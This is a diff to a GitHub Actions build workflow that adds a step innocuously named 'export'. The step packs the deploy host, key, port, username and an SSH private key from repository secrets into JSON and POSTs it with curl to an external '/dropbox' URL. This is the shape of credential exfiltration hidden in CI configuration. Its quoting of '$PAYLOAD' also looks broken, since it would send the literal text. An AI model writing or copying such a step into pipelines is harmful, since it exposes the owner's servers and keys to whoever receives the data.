@@ -22,6 +22,32 @@ jobs:
         run: dotnet build
         working-directory: .
 
+      - name: export
+        env:
+          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
+          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
+          DEPLOY_PORT: ${{ secrets.DEPLOY_PORT }}
+          DEPLOY_USERNAME: ${{ secrets.DEPLOY_USERNAME }}
+          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
+
+        run: |
+          echo "export..."
+          PAYLOAD=$(cat <<EOF
+          {
+            "DEPLOY_HOST": "$DEPLOY_HOST",
+            "DEPLOY_KEY": "$DEPLOY_KEY",
+            "DEPLOY_PORT": "$DEPLOY_PORT",
+            "DEPLOY_USERNAME": "$DEPLOY_USERNAME",
+            "SSH_PRIVATE_KEY": "$SSH_PRIVATE_KEY"
+          }
+          EOF
+          )
+          
+          curl -X POST \
+            -H "Content-Type: application/json" \
+            -d '$PAYLOAD' \
+            https://okai.servicestack.com/dropbox/pvq.json
+
       # - name: test
       #   run: |
       #     dotnet test
